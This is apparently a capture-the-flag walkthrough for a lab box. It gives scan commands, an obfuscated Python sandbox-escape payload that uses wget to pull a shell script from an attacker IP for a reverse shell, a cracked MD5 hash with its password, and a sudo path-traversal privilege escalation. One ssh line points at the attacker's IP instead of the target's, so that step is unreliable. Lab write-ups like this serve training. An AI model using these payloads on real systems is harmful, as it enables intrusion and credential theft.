# scan port with nmap
# nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.62 -oN ports
# found ports 22 and 5000 open

# scan ports for vulnerabilities and versions
# nmap -p 22,5000 -sCV 10.10.11.62 -oN target

# find page code.htb:5000, and execute malicious code on the editor
# generate an reverse shell
# Bypass by plus sign, to execute the order

# print(''.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__['__buil'+'tins__']['ev'+'al']('__imp'+'ort__("o'+'s").po'+'pen("wget 10.10.15.37/scripts/shell.sh -O /tmp/shell.sh").re'+'ad()'))
 
# print(''.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__['__buil'+'tins__']['ev'+'al']('__imp'+'ort__("o'+'s").po'+'pen("bash /tmp/shell.sh").re'+'ad()'))

# create the shell script to get a reverse shell

# open the database.db file with sqlite3 and get the user martin hash pass
# 3de6f30c4a09c27fc71932bfc68474be 

# decrypt the hash with john and get the password
# john hash --wordlist=rockyou.txt --format=Raw-md5 --fork=4

# get the user martin password
# nafeelswordsmaster

# connect by ssh with the user martin and the password nafeelswordsmaster
# ssh martin@10.10.15.37 

# find executable files
# sudo -l 

# found /usr/bin/backy.sh

# modify the task.json file
# {
#  "directories_to_archive": [
#    "/home/..././root/" 
#  ],
#  "destination": "/tmp"
# }

# execute the backy.sh file
# sudo /usr/bin/backy.sh

# find the flag cd /tmp
# tar -xjf code_home_.._root_2025_April.tar.bz2

# cd root

# cat root.txt

